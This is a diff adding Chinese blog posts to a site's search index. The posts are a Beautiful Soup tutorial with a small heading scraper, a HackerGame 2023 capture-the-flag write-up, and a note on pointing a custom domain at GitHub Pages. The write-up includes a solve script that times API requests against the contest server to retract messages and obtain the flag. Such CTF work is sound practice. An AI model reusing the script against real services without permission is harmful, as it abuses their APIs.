strikeout&quot;&gt;&lt;/p&gt;]</span></span><br><span class="line"></span><br><span class="line">css_soup.find_all(<span class="string">&quot;p&quot;</span>, class_=<span class="string">&quot;body&quot;</span>)</span><br><span class="line"><span class="comment"># [&lt;p class=&quot;body strikeout&quot;&gt;&lt;/p&gt;]</span></span><br><span class="line"></span><br><span class="line">css_soup.find_all(<span class="string">&quot;p&quot;</span>, class_=<span class="string">&quot;body strikeout&quot;</span>)</span><br><span class="line"><span class="comment"># [&lt;p class=&quot;body strikeout&quot;&gt;&lt;/p&gt;]</span></span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>同样可以设置字典进行匹配</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">soup.find_all(<span class="string">&quot;a&quot;</span>, attrs=&#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;sister&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span></span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><code>string</code> 参数：与<code>name</code>类似，多用于搜索字符串，也可与其他参数混合用于过滤结果</p>
+<p><code>limit</code> 参数：限制返回数，与<code>SQL</code>中<code>limit</code>关键字相似</p>
+<p><code>recursive</code> 参数：默认开启，检索所有子孙节点，设置为<code>false</code>后仅检索子节点</p>
+<blockquote>
+<p><code>find_all()</code>还有一种简单的调用形式</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#以下代码两两等价</span></span><br><span class="line"></span><br><span class="line">soup.find_all(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">soup(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">soup.title.find_all(string=<span class="literal">True</span>)</span><br><span class="line">soup.title(string=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<h5 id="and-more"><a href="#and-more" class="headerlink" title="and more"></a>and more</h5><p>还有很多方法：</p>
+<p><code>find()</code>查询单条</p>
+<p><code>find_parents()</code> <code>find_parent()</code>查询父辈节点</p>
+<p><code>find_next_siblings()</code> <code>find_next_sibling()</code>查询兄弟节点</p>
+<p> <code>find_previous_siblings()</code> <code>find_previous_sibling()</code> 遍历查询兄弟节点</p>
+<h4 id="修改文档树"><a href="#修改文档树" class="headerlink" title="修改文档树"></a>修改文档树</h4><p>本质上是利用遍历或者搜索来确定<code>tag</code>，然后用赋值的方式进行修改</p>
+<p>放点示例</p>
+<h5 id="修改tag名称和属性"><a href="#修改tag名称和属性" class="headerlink" title="修改tag名称和属性"></a>修改<code>tag</code>名称和属性</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">soup = BeautifulSoup(<span class="string">&#x27;&lt;b class=&quot;boldest&quot;&gt;Extremely bold&lt;/b&gt;&#x27;</span>)</span><br><span class="line">tag = soup.b</span><br><span class="line"></span><br><span class="line">tag.name = <span class="string">&quot;blockquote&quot;</span></span><br><span class="line">tag[<span class="string">&#x27;class&#x27;</span>] = <span class="string">&#x27;verybold&#x27;</span></span><br><span class="line">tag[<span class="string">&#x27;id&#x27;</span>] = <span class="number">1</span></span><br><span class="line">tag</span><br><span class="line"><span class="comment"># &lt;blockquote class=&quot;verybold&quot; id=&quot;1&quot;&gt;Extremely bold&lt;/blockquote&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> tag[<span class="string">&#x27;class&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> tag[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">tag</span><br><span class="line"><span class="comment"># &lt;blockquote&gt;Extremely bold&lt;/blockquote&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h5 id="修改-string"><a href="#修改-string" class="headerlink" title="修改.string"></a>修改<code>.string</code></h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">markup = <span class="string">&#x27;&lt;a href=&quot;http://example.com/&quot;&gt;I linked to &lt;i&gt;example.com&lt;/i&gt;&lt;/a&gt;&#x27;</span></span><br><span class="line">soup = BeautifulSoup(markup)</span><br><span class="line"></span><br><span class="line">tag = soup.a</span><br><span class="line">tag.string = <span class="string">&quot;New link text.&quot;</span></span><br><span class="line">tag</span><br><span class="line"><span class="comment"># &lt;a href=&quot;http://example.com/&quot;&gt;New link text.&lt;/a&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>如果修改<code>.string</code>的<code>tag</code>含有子孙<code>tag</code>，该修改行为会抹除其他<code>tag</code></p>
+<p>所以如果想添加内容可以使用下面的<code>append()</code>方法</p>
+</blockquote>
+<h5 id="append"><a href="#append" class="headerlink" title="append()"></a><code>append()</code></h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 与python列表的.append()类似</span></span><br><span class="line">soup = BeautifulSoup(<span class="string">&quot;&lt;a&gt;Foo&lt;/a&gt;&quot;</span>)</span><br><span class="line">soup.a.append(<span class="string">&quot;Bar&quot;</span>)</span><br><span class="line"></span><br><span class="line">soup</span><br><span class="line"><span class="comment"># &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt;FooBar&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line">soup.a.contents</span><br><span class="line"><span class="comment"># [u&#x27;Foo&#x27;, u&#x27;Bar&#x27;]</span></span><br></pre></td></tr></table></figure></div>
+
+<h5 id="NavigableString-和-new-tag"><a href="#NavigableString-和-new-tag" class="headerlink" title="NavigableString()和.new_tag()"></a><code>NavigableString()</code>和<code>.new_tag()</code></h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加文本内容</span></span><br><span class="line">soup = BeautifulSoup(<span class="string">&quot;&lt;b&gt;&lt;/b&gt;&quot;</span>)</span><br><span class="line">tag = soup.b</span><br><span class="line">tag.append(<span class="string">&quot;Hello&quot;</span>)</span><br><span class="line">new_string = NavigableString(<span class="string">&quot; there&quot;</span>)</span><br><span class="line">tag.append(new_string)</span><br><span class="line">tag</span><br><span class="line"><span class="comment"># &lt;b&gt;Hello there.&lt;/b&gt;</span></span><br><span class="line">tag.contents</span><br><span class="line"><span class="comment"># [u&#x27;Hello&#x27;, u&#x27; there&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建注释或其他NaviStr子类</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> Comment</span><br><span class="line">new_comment = soup.new_string(<span class="string">&quot;Nice to see you.&quot;</span>, Comment)</span><br><span class="line">tag.append(new_comment)</span><br><span class="line">tag</span><br><span class="line"><span class="comment"># &lt;b&gt;Hello there&lt;!--Nice to see you.--&gt;&lt;/b&gt;</span></span><br><span class="line">tag.contents</span><br><span class="line"><span class="comment"># [u&#x27;Hello&#x27;, u&#x27; there&#x27;, u&#x27;Nice to see you.&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建tag</span></span><br><span class="line">soup = BeautifulSoup(<span class="string">&quot;&lt;b&gt;&lt;/b&gt;&quot;</span>)</span><br><span class="line">original_tag = soup.b</span><br><span class="line">new_tag = soup.new_tag(<span class="string">&quot;a&quot;</span>, href=<span class="string">&quot;http://www.example.com&quot;</span>)</span><br><span class="line">original_tag.append(new_tag)</span><br><span class="line">original_tag</span><br><span class="line"><span class="comment"># &lt;b&gt;&lt;a href=&quot;http://www.example.com&quot;&gt;&lt;/a&gt;&lt;/b&gt;</span></span><br><span class="line">new_tag.string = <span class="string">&quot;Link text.&quot;</span></span><br><span class="line">original_tag</span><br><span class="line"><span class="comment"># &lt;b&gt;&lt;a href=&quot;http://www.example.com&quot;&gt;Link text.&lt;/a&gt;&lt;/b&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h5 id="and-more-1"><a href="#and-more-1" class="headerlink" title="and more"></a>and more</h5><p>这里就用类似描述一下，具体实现可以实操看看</p>
+<p><code>.insert(*位置*, &quot;...&quot;)</code>：插入指定位置</p>
+<p><code>.insert_before(&quot;...&quot;)</code> <code>insert_after(&quot;...&quot;)</code>：插入节点前&#x2F;后</p>
+<p><code>.clear()</code> ：清除<code>tag</code>内容</p>
+<p><code>.extract()</code>：剪切<code>tag</code></p>
+<p><code>.decompose()</code>：删除<code>tag</code></p>
+<p><code>.replace_with()</code>：替换<code>tag</code>，原<code>tag</code>返回</p>
+<p><code>.wrap</code>：包装一层<code>tag</code></p>
+<p><code>.unrap</code>：拆包装，拆掉的<code>tag</code>返回</p>
+<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><p>就简单说一下，其实就是几个不同的输出格式以及输出方法</p>
+<p><code>.prettify()</code>：缩进型树状输出，可以传入编码方式来修改输出</p>
+<p><code>.unicode()</code> <code>.str()</code>：这两个是<code>python</code>方法，后者默认<code>UTF-8</code>但可变</p>
+<p><code>.encode()</code> <code>.decode()</code>：分别获得字节码、<code>Unicode</code></p>
+<p><code>.get_text()</code>：获取<code>tag</code>中的文本内容，返回<code>Unicode</code></p>
+<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可以通过参数指定tag的文本内容的分隔符:</span></span><br><span class="line">soup.get_text(<span class="string">&quot;|&quot;</span>)</span><br><span class="line"><span class="comment">#u&#x27;\nI linked to |example.com|\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 还可以去除获得文本内容的前后空白:</span></span><br><span class="line">soup.get_text(<span class="string">&quot;|&quot;</span>, strip=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#u&#x27;I linked to|example.com&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><blockquote>
+<p>感觉这部分内容大多数时候还是可以相信自动识别的</p>
+<p>也就是一个自定义和一个自排除功能</p>
+<p>知道有然后真碰上识别错误再修正就好了</p>
+</blockquote>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自定义</span></span><br><span class="line">soup = BeautifulSoup(markup, from_encoding=<span class="string">&quot;iso-8859-8&quot;</span>)</span><br><span class="line">soup.h1</span><br><span class="line">&lt;h1&gt;םולש&lt;/h1&gt;</span><br><span class="line">soup.original_encoding</span><br><span class="line"><span class="string">&#x27;iso8859-8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自排除</span></span><br><span class="line">soup = BeautifulSoup(markup, exclude_encodings=[<span class="string">&quot;ISO-8859-7&quot;</span>])</span><br><span class="line">soup.h1</span><br><span class="line">&lt;h1&gt;םולש&lt;/h1&gt;</span><br><span class="line">soup.original_encoding</span><br><span class="line"><span class="string">&#x27;WINDOWS-1255&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="解析部分文档"><a href="#解析部分文档" class="headerlink" title="解析部分文档"></a>解析部分文档</h4><p>节省内存的方式，感觉还是有用的吧应该？</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">html_doc = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;</span></span><br><span class="line"><span class="string">and they lived at the bottom of a well.&lt;/p&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(BeautifulSoup(html_doc, <span class="string">&quot;html.parser&quot;</span>, parse_only=only_a_tags).prettify())</span><br><span class="line"><span class="comment"># &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;</span></span><br><span class="line"><span class="comment">#  Elsie</span></span><br><span class="line"><span class="comment"># &lt;/a&gt;</span></span><br><span class="line"><span class="comment"># &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;</span></span><br><span class="line"><span class="comment">#  Lacie</span></span><br><span class="line"><span class="comment"># &lt;/a&gt;</span></span><br><span class="line"><span class="comment"># &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;</span></span><br><span class="line"><span class="comment">#  Tillie</span></span><br><span class="line"><span class="comment"># &lt;/a&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(BeautifulSoup(html_doc, <span class="string">&quot;html.parser&quot;</span>, parse_only=only_tags_with_id_link2).prettify())</span><br><span class="line"><span class="comment"># &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;</span></span><br><span class="line"><span class="comment">#  Lacie</span></span><br><span class="line"><span class="comment"># &lt;/a&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(BeautifulSoup(html_doc, <span class="string">&quot;html.parser&quot;</span>, parse_only=only_short_strings).prettify())</span><br><span class="line"><span class="comment"># Elsie</span></span><br><span class="line"><span class="comment"># ,</span></span><br><span class="line"><span class="comment"># Lacie</span></span><br><span class="line"><span class="comment"># and</span></span><br><span class="line"><span class="comment"># Tillie</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<br>
+
+<hr>
+<h2 id="Baby级实践"><a href="#Baby级实践" class="headerlink" title="Baby级实践"></a>Baby级实践</h2><p>好耶！是新章节！其实就是Friend提供的一个程序（笑，和一道题目罢了</p>
+<h3 id="对K1r4Ca‘s-Blog宝具"><a href="#对K1r4Ca‘s-Blog宝具" class="headerlink" title="对K1r4Ca‘s Blog宝具"></a>对K1r4Ca‘s Blog宝具</h3><blockquote>
+<p>本宝具由RUSL Ec3o锻造，可对K1r4Ca’s Blog造成特攻伤害！</p>
+</blockquote>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_headlines</span>(<span class="params">url, headers</span>):</span><br><span class="line">    response = requests.get(url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;网络连接错误&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    h3_tags = soup.find_all(<span class="string">&#x27;h3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 逐一提取&lt;h3&gt;标签中的文本内容</span></span><br><span class="line">    <span class="keyword">for</span> tag <span class="keyword">in</span> h3_tags:</span><br><span class="line">        h3_content = tag.get_text(strip=<span class="literal">True</span>)</span><br><span class="line">        <span class="built_in">print</span>(h3_content)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://k1r4ca.github.io/&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fetch_headlines(url, headers)</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>嗯，抓过的都说好。我从小抓到大。</p>
+</blockquote>
+<h3 id="HackerGame-2023-模拟组委会"><a href="#HackerGame-2023-模拟组委会" class="headerlink" title="HackerGame 2023 模拟组委会"></a>HackerGame 2023 模拟组委会</h3><p>这道题一开始看到其实有点儿懵，因为我是前端懂不了一点的小five，所以就很完美的无法想到官方给的那个控制台脚本解……嗯学到了学到了思密达。</p>
+<p>抓了个包，发现数据会一次性以json格式全部发向前端，就硬着头皮＋GPT写了个类爬虫程序，定时发送请求模拟点击撤回消息，最后拿到flag</p>
+<p>最后发现官方把我这种解法当做彩蛋解法了（</p>
+<p>因为前端知识太匮乏导致只能恰恰彩蛋力（悲</p>
+<blockquote>
+<p>一起来吧！</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/post/0x04/http.png"
+                      alt="http"
+                ></p>
+<p>可以看到通过几个接口来获取数据，原理其实也挺简单的</p>
+<p>后端向前端发的数据大概是这样：</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//官方给的源码中生成json的方式 </span></span><br><span class="line"><span class="attr">&quot;messages&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">     <span class="punctuation">&#123;</span><span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> message.text<span class="punctuation">,</span> <span class="attr">&quot;delay&quot;</span><span class="punctuation">:</span> message.delay<span class="punctuation">&#125;</span> for message in messages</span><br><span class="line">        <span class="punctuation">]</span></span><br></pre></td></tr></table></figure></div>
+
+<p>要撤回的flag是这么生成的：(中括号撤，大括号不撤，这样)</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;这道题 flag 是&quot;</span></span><br><span class="line">           + <span class="string">f&quot;hack[<span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(random.choice(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(l))&#125;</span>]&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>贴个我的payload</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jsonpath</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">    <span class="comment"># 这里设置一下几个接口</span></span><br><span class="line">    url_get = <span class="string">&quot;http://202.38.93.111:10021/api/getMessages&quot;</span></span><br><span class="line">    url_del = <span class="string">&quot;http://202.38.93.111:10021/api/deleteMessage&quot;</span></span><br><span class="line">    url_flag = <span class="string">&quot;http://202.38.93.111:10021/api/getflag&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 这里隐藏掉了Cookie，是用于身份认证的，做题的时候也是必须要带着的</span></span><br><span class="line">    <span class="comment"># 不知道有没有影响反正打码了先</span></span><br><span class="line">    header = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;_ga=*********; _ga_R1FN4KJKJH=*********; session=*******&quot;</span>,<span class="string">&quot;Origin&quot;</span>:<span class="string">&quot;http://202.38.93.111:10021&quot;</span>,<span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://202.38.93.111:10021/&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送请求</span></span><br><span class="line">    res = requests.post(url=url_get, headers=header).text</span><br><span class="line">    <span class="comment"># 这个点开始计时，用于后面确定延时</span></span><br><span class="line">    time_start = time.time()</span><br><span class="line">    <span class="comment"># 载入响应的json</span></span><br><span class="line">    content = json.loads(res)</span><br><span class="line">	</span><br><span class="line">    <span class="comment"># 利用jsonpath库来解析获得两个关键参数的列表</span></span><br><span class="line">    delay = jsonpath.jsonpath(content,<span class="string">&quot;$.messages[*].delay&quot;</span>)</span><br><span class="line">    text = jsonpath.jsonpath(content, <span class="string">&quot;$.messages[*].text&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 这里就一个一个调出来看了</span></span><br><span class="line">    <span class="comment"># 因为是按延时升序排列的，所以一个一个对过去就好</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">        <span class="comment"># 匹配一下字符，如果是就进入死循环</span></span><br><span class="line">        <span class="comment"># 算小小利用了一下嵌入式编程里面的思想？</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="string">&quot;hack[&quot;</span> <span class="keyword">in</span> text[i]):</span><br><span class="line">            time_now=time.time()		<span class="comment"># 这里是获取实时时间</span></span><br><span class="line">            <span class="keyword">if</span>(time_now &gt;= time_start+delay[i]):	<span class="comment"># 实时时间-开始时间来比对延时</span></span><br><span class="line">                <span class="built_in">print</span>(text[i])</span><br><span class="line">                json = &#123;<span class="string">&quot;id&quot;</span>: i&#125;</span><br><span class="line">                <span class="comment"># 这里发送撤回请求</span></span><br><span class="line">                res = requests.post(url=url_del, headers=header, json=json).text</span><br><span class="line">                <span class="keyword">break</span>		<span class="comment">#跳出去寻找下一个符合要求的text</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 等全部都发完了就可以向服务器伸手拿flag辣</span></span><br><span class="line">    flag = requests.post(url=url_flag, headers=header).text</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/post/0x04/flag.png"
+                      alt="flag_committee"
+                ></p>
+<p>其实感觉也不算很难，没什么弯弯绕绕的，不过毕竟是第一次自己写python脚本，也是解的第一道算是有点难度的ctf题，收藏价值大于一切啦~</p>
+<p>继续努力吧！</p>
+<blockquote>
+<p>还有很多乱七八糟的东西就不打在上面了，什么b站诈骗视频啊，什么114514啊，什么疯狂星期四啊，什么看mygo看的啊，真的是完全搞不懂在说什么！</p>
+</blockquote>
+<br>
+
+<hr>
+<h2 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h2><blockquote>
+<p>一切要有始有终</p>
+</blockquote>
+<p>拖了这么长终于写完了！<del>倒不如说是抄文档抄完了</del></p>
+<p>多多少少是多了解了一点爬虫的东西，但是不得不说还是没什么上手经验，以后多用用吧</p>
+<p>比如说像ec3o师傅拿到我blog第一件事是爬一下先——   真是！多棒一小伙儿！</p>
+<p>感觉自己写了很多，又像什么都没写一样，感觉这知识它不进脑子啊！（恼</p>
+<p>唉，such is life</p>
+<p>有时候真的会对着电脑屏幕发怵，不知道怎么开始……大抵是被GPT惯坏了吧，我觉得这样不行捏。虽然说能使用工具也是能力的体现，但是我觉得我有点过于没用了。</p>
+<p>但是感觉自己不知道是记忆力不好还是太懒惰了，遗忘太快是没什么能力的主要原因。可能要再多努力一点？</p>
+<p>我确实是挺懒一人（瑞瑞的……</p>
+<p>PITY. Life’s a struggle…</p>
+<p>加油捏。</p>
+<blockquote>
+<p>参考文章</p>
+<p><a class="link"   href="https://beautifulsoup.readthedocs.io/zh-cn/v4.4.0/#id65" >Beautiful Soup 4.4.0 文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://www.runoob.com/python3/python-requests.html" >Python requests 模块 | 菜鸟教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
+<p><a class="link"   href="https://github.com/USTC-Hackergame/hackergame2023-writeups/tree/master/official/%E7%BB%84%E5%A7%94%E4%BC%9A%E6%A8%A1%E6%8B%9F%E5%99%A8" >hackergame2023-writeups 组委会模拟器  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/official/%E7%BB%84%E5%A7%94%E4%BC%9A%E6%A8%A1%E6%8B%9F%E5%99%A8/src/src/backend/app/main.py#L84-L181" >hackergame2023-writeups 组委会模拟器 src <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Web</category>
+        <category>开发</category>
+      </categories>
+      <tags>
+        <tag>python爬虫</tag>
+        <tag>hackergame</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x06 GithubPage域名绑定</title>
+    <url>/2023/12/01/BlogDomain/</url>
+    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote>
+<p>勿以浮沙筑高台</p>
+</blockquote>
+<p>距离期中考试仅剩一天！</p>
+<p>这两天Nacl在搭他的blog，想到自己的blog还没个正式点的域名，之前一直通不过实名验证审核，于是这次就买了国外域名绑在Github Page上 <em>如你所见现在是<a href="https://k1r4ca.top/">k1r4ca.top</a></em></p>
+<p>整体流程比想象中顺利很多，昨天睡前搞好的，中午休息时间简单记录一下~</p>
+<h2 id="域名购买"><a href="#域名购买" class="headerlink" title="域名购买"></a>域名购买</h2><p>简单找了一下推荐什么的，然后选择了<a class="link"   href="https://www.namesilo.com/" >NameSilo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，也没什么特别原因，感觉价格能接受就直接下单了，花了$1.88（￥13.48）（7.17089的汇率，唉），感觉上是不贵的，当然部分原因是<code>.top</code>实在不是什么好域就是……</p>
+<p>官网点进去，注册个账号，域名一搜，然后购物车一加，check out就好了</p>
+<p>个人信息貌似是for Tax？</p>
+<p>购买之后右上角头像-<code>My Account</code>进入Home Page，再点击<code>Domain Manager</code>-<code>刚刚购买的域名</code> 就能进行管理了</p>
+<blockquote>
+<p>不得不吐槽一下，从之前的页面点进这个域名管理，UI让我觉得自己时光穿梭了……</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/post/0x05/DomainConsole.png"
+                      alt="DomainConsole"
+                ></p>
+<p>然后要添加DNS记录，以保证域名进行正确解析  <em>这里就简单记录一下设置过程，之后会专门学一下</em></p>
+<p>点击<code>DNS Records</code>右侧的<code>Update</code>，因为我这里设置连接到的是<code>Github Page</code>，所以在下面的<code>DNS Templates</code>区域直接找到提供的<code>Github</code>模板，点击<code>Apply Template</code>-<code>Accept</code>就行，此操作会写下四条<code>A记录</code>，用于连接到Github的服务器，然后再在上面<code>Existing Resource Records</code>区域找到默认设置的<code>CNAME记录</code>，点<code>Edit</code>图标将其<code>Address/Value</code>值修改为<code>*YourGithubID*.github.io</code>，保存后域名服务商部分设置就完成了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/post/0x05/DomainSetting.png"
+                      alt="DomainConsole"
+                ></p>
+<p>然后还要在Github上配置一下，进入blog仓库的设置页面，<code>Pages</code>-<code>Custom domain</code>里填上刚刚设置好的域名，等待连接检查完毕，最后勾选上<code>Enforce HTTPS</code> <del>防止你的小伙伴儿觉得你的页面有安全风险</del> 设置就完成辣</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/post/0x05/GithubSetting.png"
+                      alt="DomainConsole"
+                ></p>
+<blockquote>
+<p>如NameSilo所述，记录是周期性更新的，这导致域名服务端设置生效会有十五分钟左右的延迟，在这期间GitHub上的<code>DNS check</code>还是会报错，等待更新完毕就好了</p>
+</blockquote>
+<h2 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h2><blockquote>
+<p>一切都要有始有终</p>
+</blockquote>
+<p>过程不太复杂，总算是有个正经域名了！一直担心domain设置那边会出问题，毕竟记录方面的知识计网速通了就忘完了……之后补之后补……</p>
+<p>唉，重新进入数学模式了<del>要复习不完了</del>救命~</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+        <category>Blog</category>
+      </categories>
+      <tags>
+        <tag>DNS记录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>&#39;0x07-C语言基础刷题记录&#39;</title>
+    <url>/2023/12/05/Cprac/</url>
+    <content><![CDATA[<h2 id="Introductio"><a href="#Introductio" class="headerlink" title="Introductio"></a>Introductio</h2><blockquote>
+<p>勿以浮沙筑高台</p>
+</blockquote>
